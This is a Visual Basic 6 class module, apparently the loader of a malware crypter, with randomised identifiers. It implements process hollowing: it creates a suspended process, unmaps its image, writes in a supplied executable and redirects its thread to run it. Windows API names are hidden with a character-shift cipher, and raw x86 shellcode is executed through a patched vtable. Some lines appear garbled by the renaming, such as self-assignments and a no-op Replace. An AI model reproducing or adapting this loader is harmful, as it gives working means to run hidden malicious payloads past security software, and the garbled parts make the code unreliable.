VERSION 1.0 CLASS
BEGIN
  MultiUse = -1
  Persistable = 0
  DataBindingBehavior = 0
  DataSourceBehavior = 0
  MTSTransactionMode = 0
End
Attribute VB_Name = "GjGQAL"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Const RwfNWPGH                  As Long = &H5A4D&
Private Const Pu2p6onU                  As Long = &H4550&
Private Const OnJJOnu1T                     As Long = &H40
Private Const I8FYTB                     As Long = &HF8
Private Const LvugZ0H                  As Long = &H28
Private Const J91PdX3yI                  As Long = &H28
Private Const E98OwQ3D                    As String = "8B4C2408B830000000648B008B400C8B401C8B008B4008890131C0C3"
Private Const GdPlvW                     As String = "8B4C240851<PATCH1>E8<PATCH2>5989016631C0C3"
Private Const Kz8rAvD                       As String = "<PATCH1>"
Private Const QXF                      As String = "<PATCH2>"
Private Const OtUP                     As Long = &H10007
Private Const S2U7WvV                     As Long = &H4
Private Const HwU                     As Long = &H1000
Private Const K5zWPjJ                     As Long = &H2000
Private Const ILxwiG                  As Long = &H40
Private Type Tce4yW
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type
Private Type CELaXLqK
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type
Private Type HlmzGhY
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type
Private Type EheskP
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As  HlmzGhY
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type
Private Type FHUh3fnhR
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type
Private Type RwdSH78H
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type
Private Type Pu0urWfU
    VirtualAddress              As Long
    Size                        As Long
End Type
Private Type PoHO9VlQT
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As Pu0urWfU
End Type
Private Type EtMBEM
    Signature                   As Long
    FileHeader                  As RwdSH78H
    OptionalHeader              As PoHO9VlQT
End Type
Private Type TnXhD6nI
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type
Private Type GjGQAL
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type
private Declare Sub Ku8W Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private c_lKrnl         As Long
Private c_lLoadLib      As Long
Private c_bInit         As Boolean
Private c_lVTE          As Long
Private c_lOldVTE       As Long
Private c_bvASM(&HFF)   As Byte
Public Function P6l9aQQ() As Long
End Function
Public Function EtO6TM(ByRef VSYIuO() As Byte, Optional GYX6gNW As String) As Boolean
  Dim i                       As Long
  Dim QISXqkK                  As FHUh3fnhR
  Dim FBc2orOhJ                   As EtMBEM
  Dim Q6jDL8Q                    As GjGQAL
  Dim N3bH                   As Tce4yW
  Dim VODDlfg8IM                  As CELaXLqK
  Dim ACi17kNX                    As EheskP
  Dim GqnN                    As Long
  Dim JjOZO                    As Long
  Dim I9EcEC                    As Long
  If Not c_bInit Then Exit Function
  Call Ku8W(QISXqkK, VSYIuO(0), OnJJOnu1T)
  If Not QISXqkK.e_magic = RwfNWPGH Then
  Exit Function
  End If
  Call Ku8W(FBc2orOhJ, VSYIuO(QISXqkK.e_lfanew), I8FYTB)
  If Not FBc2orOhJ.Signature = Pu2p6onU Then
  Exit Function
End If
  GqnN = QIUS42K(P5m5kwQ("icplcj10"))
  I9EcEC = QIUS42K(P5m5kwQ("lrbjj"))
  If GYX6gNW = vbNullString Then
  GYX6gNW = Space(260)
  JjOZO = TmYcROvI(GqnN, P5m5kwQ("EcrKmbsjcDgjcL_kcU"))
  GjILPL JjOZO, App.hInstance, StrPtr(GYX6gNW), 260
  End If
  With FBc2orOhJ.OptionalHeader
  N3bH.cb = Len(N3bH)
  JjOZO = TmYcROvI(GqnN, P5m5kwQ("Apc_rcNpmacqqU"))
  GjILPL JjOZO, 0, StrPtr(GYX6gNW), 0, 0, 0, S2U7WvV, 0, 0, VarPtr(N3bH), VarPtr(VODDlfg8IM)
  JjOZO = TmYcROvI(I9EcEC, P5m5kwQ("LrSlk_nTgcuMdQcargml"))
  GjILPL JjOZO, VODDlfg8IM.hProcess, .ImageBase
  JjOZO = TmYcROvI(GqnN, P5m5kwQ("Tgprs_j?jjmaCv"))
  GjILPL JjOZO, VODDlfg8IM.hProcess, .ImageBase, .SizeOfImage, HwU Or K5zWPjJ, ILxwiG
  JjOZO = TmYcROvI(GqnN, P5m5kwQ("UpgrcNpmacqqKckmpw"))
  GjILPL JjOZO, VODDlfg8IM.hProcess, .ImageBase, VarPtr(VSYIuO(0)), .SizeOfHeaders, 0
  For i = 0 To FBc2orOhJ.FileHeader.NumberOfSections - 1
  Ku8W Q6jDL8Q, VSYIuO(QISXqkK.e_lfanew + I8FYTB + J91PdX3yI * i), Len(Q6jDL8Q)
  GjILPL JjOZO, VODDlfg8IM.hProcess, .ImageBase + Q6jDL8Q.VirtualAddress, VarPtr(VSYIuO(Q6jDL8Q.PointerToRawData)), Q6jDL8Q.SizeOfRawData, 0
  Next i
  ACi17kNX.ContextFlags = OtUP
  JjOZO = TmYcROvI(I9EcEC, P5m5kwQ("LrEcrAmlrcvrRfpc_b"))
  GjILPL JjOZO, VODDlfg8IM.hThread, VarPtr(ACi17kNX)
  JjOZO = TmYcROvI(GqnN, P5m5kwQ("UpgrcNpmacqqKckmpw"))
  GjILPL JjOZO, VODDlfg8IM.hProcess, ACi17kNX.Ebx + 8, VarPtr(.ImageBase), 4, 0
  ACi17kNX.Eax = .ImageBase + .AddressOfEntryPoint
  JjOZO = TmYcROvI(I9EcEC, P5m5kwQ("LrQcrAmlrcvrRfpc_b"))
  GjILPL JjOZO, VODDlfg8IM.hThread, VarPtr(ACi17kNX)
  JjOZO = TmYcROvI(I9EcEC, P5m5kwQ("LrPcqskcRfpc_b"))
  GjILPL JjOZO, VODDlfg8IM.hThread, 0
  End With
  EtO6TM = True
End Function
Public Function GjILPL(ByVal MvtlKiH As Long, ParamArray J90UOFvNJ()) As Long
  Dim EA6Ti8uE        As Long
  Dim i           As Long
  Dim GdPlvW        As String
  Dim Kz8rAvD        As String
  If MvtlKiH = 0 Then Exit Function
  For i = UBound(J90UOFvNJ) To 0 Step -1
  Kz8rAvD = Kz8rAvD & "68" & M2cH(CLng(J90UOFvNJ(i)))
  Next
  EA6Ti8uE = VarPtr(c_bvASM(0))
  EA6Ti8uE = EA6Ti8uE + (UBound(J90UOFvNJ) + 2) * 5
  EA6Ti8uE = MvtlKiH - EA6Ti8uE - 5
  GdPlvW = GdPlvW
  GdPlvW = Replace(GdPlvW, Kz8rAvD, Kz8rAvD)
  GdPlvW = Replace(GdPlvW, QXF, M2cH(EA6Ti8uE))
  Call VNF80xojWM(GdPlvW)
  GjILPL = ABkxM1WX
End Function
Private Function M2cH(ByVal CELaXLqK As Long) As String
  Dim QXF(3)   As Byte
  Dim i           As Long
  Ku8W QXF(0), CELaXLqK, &H4
  For i = 0 To 3
  M2cH = M2cH & Right("0" & Hex(QXF(i)), 2)
  Next
End Function
Private Sub VNF80xojWM(ByVal HlmzGhY As String)
  Dim i   As Long
  For i = 0 To Len(HlmzGhY) - 1 Step 2
  c_bvASM((i / 2)) = CByte("&h" & Mid$(HlmzGhY, i + 1, 2))
  Next
End Sub
Private Function ABkxM1WX() As Long
  Ku8W c_lVTE, ByVal ObjPtr(Me), &H4
  c_lVTE = c_lVTE + &H1C
  Ku8W c_lOldVTE, ByVal c_lVTE, &H4
  Ku8W ByVal c_lVTE, VarPtr(c_bvASM(0)), &H4
  ABkxM1WX = P6l9aQQ
  Ku8W ByVal c_lVTE, c_lOldVTE, &H4
End Function
Public Function FBey29WIJ(ByVal VSYIuO As String, ByVal Tce4yW As String) As Long
  FBey29WIJ = Me.TmYcROvI(Me.QIUS42K(VSYIuO), Tce4yW)
End Function
Public Function QIUS42K(ByVal GYX6gNW As String) As Long
  QIUS42K = GjILPL(c_lLoadLib, StrPtr(GYX6gNW & vbNullChar))
End Function
Public Property Get Initialized() As Boolean
  Initialized = c_bInit
End Property
Private Sub Class_Initialize()
  Call VNF80xojWM(E98OwQ3D)
  c_lKrnl = ABkxM1WX
  If Not c_lKrnl = 0 Then
  c_lLoadLib = TmYcROvI(c_lKrnl, P5m5kwQ("Jm_bJg`p_pwU"))
  If Not c_lLoadLib = 0 Then
  c_bInit = True
  End If
  End If
End Sub
Public Function TmYcROvI(ByVal K5zWPjJ As Long, ByVal ILxwiG As String) As Long
  Dim OtUP                  As FHUh3fnhR
  Dim S2U7WvV                   As EtMBEM
  Dim HwU                   As TnXhD6nI
  Call Ku8W(OtUP, ByVal K5zWPjJ, OnJJOnu1T)
  If Not OtUP.e_magic = RwfNWPGH Then
  Exit Function
  End If
  Call Ku8W(S2U7WvV, ByVal K5zWPjJ + OtUP.e_lfanew, I8FYTB)
  If Not S2U7WvV.Signature = Pu2p6onU Then
  Exit Function
  End If
  Dim lVAddress   As Long
  Dim lVSize      As Long
  Dim lBase       As Long
  With S2U7WvV.OptionalHeader
  lVAddress = K5zWPjJ + .DataDirectory(0).VirtualAddress
  lVSize = lVAddress + .DataDirectory(0).Size
  lBase = .ImageBase
  End With
  Call Ku8W(HwU, ByVal lVAddress, LvugZ0H)
  Dim i           As Long
  Dim lFunctAdd   As Long
  Dim lNameAdd    As Long
  Dim lNumbAdd    As Long
  With HwU
  For i = 0 To .NumberOfNames - 1
  Ku8W lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4, 4
  If JiQUO(lBase + lNameAdd) = ILxwiG Then
  Ku8W lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2, 2
  Ku8W lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4, 4
  TmYcROvI = lFunctAdd + lBase
  If TmYcROvI >= lVAddress And TmYcROvI <= lVSize Then
  Call GppN(TmYcROvI, K5zWPjJ, ILxwiG)
  If Not K5zWPjJ = 0 Then
  TmYcROvI = TmYcROvI(K5zWPjJ, ILxwiG)
  Else
  TmYcROvI = 0
  End If
  End If
  Exit Function
  End If
  Next
  End With
End Function
Private Function GppN( ByVal Pu0urWfU As Long, ByRef PoHO9VlQT As Long, ByRef EtMBEM As String)
  Dim FHUh3fnhR     As String
  FHUh3fnhR = JiQUO(Pu0urWfU)
  If InStr(1, FHUh3fnhR, ".") Then
  PoHO9VlQT = QIUS42K(split(FHUh3fnhR, ".")(0))
  EtMBEM = split(FHUh3fnhR, ".")(1)
  End If
End Function
Private Function JiQUO(ByVal TnXhD6nI As Long) As String
  Dim RwdSH78H       As Byte
  Do
  Ku8W RwdSH78H, ByVal TnXhD6nI, 1
  TnXhD6nI = TnXhD6nI + 1
  If RwdSH78H = 0 Then Exit Do
  JiQUO = JiQUO & Chr$(RwdSH78H)
  Loop
End Function
Public Function P5m5kwQ(LvugZ0H) As String
  Dim GppN As Long
  Dim JiQUO As Long
  Dim I8FYTB As String
  For GppN = 1 To Len(LvugZ0H)
  JiQUO = Asc(Mid(LvugZ0H, GppN, 1)) + 2
  I8FYTB = I8FYTB & Chr(JiQUO)
  Next GppN
  P5m5kwQ = I8FYTB
End Function
